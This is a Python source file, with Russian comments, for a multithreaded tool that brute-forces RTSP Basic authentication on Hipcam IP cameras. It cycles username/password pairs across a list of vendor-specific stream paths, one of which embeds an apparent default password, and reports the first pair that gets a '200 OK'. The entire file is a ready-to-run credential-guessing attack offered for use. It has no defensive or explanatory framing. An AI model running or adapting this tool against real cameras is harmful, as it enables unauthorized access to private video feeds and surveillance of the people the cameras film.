# hipcam_brute.py
import socket
import base64
import threading
import queue


class HipcamBruteforcer:
    """
    Многопоточный брутфорс RTSP-аутентификации для камер Hipcam.
    """

    def __init__(self, ip, port=554, threads=10, timeout=5):
        self.ip = ip
        self.port = port
        self.threads = threads
        self.timeout = timeout
        self.found_credentials = None
        self.lock = threading.Lock()
        self.stop_flag = threading.Event()

        # RTSP-пути, характерные для Hipcam
        self.rtsp_paths = [
            "/11",
            "/1",
            "/h264_stream",
            "/Streaming/Channels/1",
            "/user=admin_password=tlJwpbo6_channel=1_stream=0.sdp",
            "/tcp/av0_0",
            "/udp/av0_0",
            "/medias2",
            "/snapshot.jpg",
            "/tmpfs/auto.jpg",
            "/tmpfs/snap.jpg",
        ]

    def _try_credentials(self, username, password, path):
        """Проверяет пару логин/пароль на одном RTSP-пути."""
        try:
            auth_b64 = base64.b64encode(f"{username}:{password}".encode()).decode()

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.ip, self.port))

            rtsp_url = f"rtsp://{self.ip}:{self.port}{path}"
            req = (
                f"DESCRIBE {rtsp_url} RTSP/1.0\r\n"
                f"CSeq: 2\r\n"
                f"Authorization: Basic {auth_b64}\r\n"
                f"User-Agent: HipcamBrute\r\n\r\n"
            )
            sock.send(req.encode())

            response = sock.recv(4096).decode(errors="ignore")
            sock.close()

            return "200 OK" in response

        except (socket.error, socket.timeout):
            return False

    def _worker(self, credential_queue):
        """Рабочий поток: берёт пары из очереди и проверяет их."""
        while not self.stop_flag.is_set():
            try:
                username, password = credential_queue.get_nowait()
            except queue.Empty:
                break

            for path in self.rtsp_paths:
                if self.stop_flag.is_set():
                    break
                if self._try_credentials(username, password, path):
                    with self.lock:
                        if self.found_credentials is None:
                            self.found_credentials = (username, password, path)
                            print(f"[+] Учетные данные найдены: {username}:{password} (путь: {path})")
                            self.stop_flag.set()
                    break

            credential_queue.task_done()

    def brute(self, credentials):
        """
        Запускает многопоточный брутфорс.
        credentials: список кортежей (username, password)
        Возвращает (username, password, path) или None.
        """
        credential_queue = queue.Queue()
        for username, password in credentials:
            credential_queue.put((username, password))

        print(f"[*] Всего комбинаций: {credential_queue.qsize()}")
        print(f"[*] Потоков: {self.threads}")

        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self._worker, args=(credential_queue,))
            t.daemon = True
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

        return self.found_credentials
